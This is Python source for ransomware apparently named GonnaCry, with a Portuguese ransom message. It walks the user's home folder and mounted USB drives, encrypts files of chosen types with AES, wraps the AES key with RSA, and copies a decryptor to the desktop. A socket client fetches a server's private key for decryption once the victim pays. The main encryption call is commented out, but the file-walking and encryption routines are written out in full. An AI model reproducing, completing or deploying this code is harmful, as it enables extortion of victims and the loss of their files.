#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import multiprocessing
import getpass
import sys
import shutil

from AES import *
from RSA import *
from SRSA import *


texto='''

    Bom dia, você foi vitma do Ransomware.

'''

# ponto de partida da criptografia
def menu(senha_AES,modo):
    # caminho de partida
    home=os.environ['HOME']
    # lista com os tipos
    f=open('tipos_arquivos.txt','r')
    tipos=f.read()
    tipos=tipos.split('\n')

    f=open(os.environ['HOME']+'/Desktop/caminho_gc.txt','r')
    a=f.read()

    listar(senha_AES,home,tipos,modo)
    listar_media(senha_AES,modo,tipos)


def listar_media(senha_AES,modo,tipos_arq):
    print('Procurando por pendrives/HDs')
    caminho='/media/'+getpass.getuser()
    if(os.path.isdir(caminho)):
        listar(senha_AES,caminho,tipos_arq,modo)



def listar(chave_AES,diretorio, tipos_arq, modo):
    if(modo==1): # criptografa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                for ext in tipos_arq:
                    if(extensao[1]==ext):
                        a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                        try:
                            criptografa(chave_AES,a)
                        except:
                            print('erro ao criptografar-> ' +str(a))

    else: # descriptgrafa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                if(extensao[1]=='.cripto'):
                    a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                    descriptografa(chave_AES,a)


def client(IP_serv):
    try:
        s = socket.socket()
        s.connect((IP_serv,9999))
    except socket.error as e:
        print('Erro de conexão: '+str(e))
        exit()
    l = s.recv(1024)
    f = open ("keys/CHAVE_PRIVADA_SERVIDOR.txt", "wb")
    while (l):
        f.write(l)
        l = s.recv(1024)
    f.close()
    s.close()

def gera_chave_AES():
    # GERA SENHA AES que vai criptografar os arquivos
    # Salva senha em arquivo.txt
    tamanho=30
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    try:
        f=open('keys/AES.txt','w')
    except IOError:
        os.mkdir('keys')
        f=open('keys/AES.txt','w')
    f.write(senha)
    f.close()
    return senha



def crypto_all():




    ## IGNORAR ARQUIVOS DO RANSOM
    AES_key=gera_chave_AES()
    print('[*] Chave AES gerada')
    #menu(AES_key,1) # -> criptografa tudo
    AES_to_RSA()
    print('[*] Senha AES criptografado com chave RSA')
    RSA_to_SRSA()
    print('[*] Chave privada do cliente criptografada')

    # salva o caminho do GonnaCry
    a=os.getcwd()
    desktop='/Área\ de\ Trabalho/'
    rumo=os.environ['HOME']
    if(os.path.isdir(rumo+desktop)):
        f=open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
        f.write(a)
        shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
    else:
        desktop='/Desktop/'
        f=open(os.environ['HOME']+desktop+'caminho_gc.txt','w')
        f.write(a)
        shutil.copyfile(a+'/decryptor.py',rumo+desktop+'Decryptor.py')
    print('[*] Caminho salvo')

def decrypt_all():
    client('localhost')
    SRSA_to_RSA()
    print('[*] chave privada do cliente descriptografada')
    RSA_to_AES()
    print('[*] chave AES descriptografada')

    f=open('keys/AES.txt','r')
    a=f.read()
    tam=len(a)
    if(tam==30):
        adsas=1
        #menu(a,2)

crypto_all()
#decrypt_all()

# == ALGORITMO ==
    # criptografa todos os arquivos com AES

    # criptografa a chave AES

    # criptografa a chave privada RSA


    ############### SE PAGAR #####################


    # descriptografa a chave privada (R) com a chave privada(S)

    # descriptografa a chave AES, com a chave privada (R)

    # descriptografa todos os arquivos com a chave AES
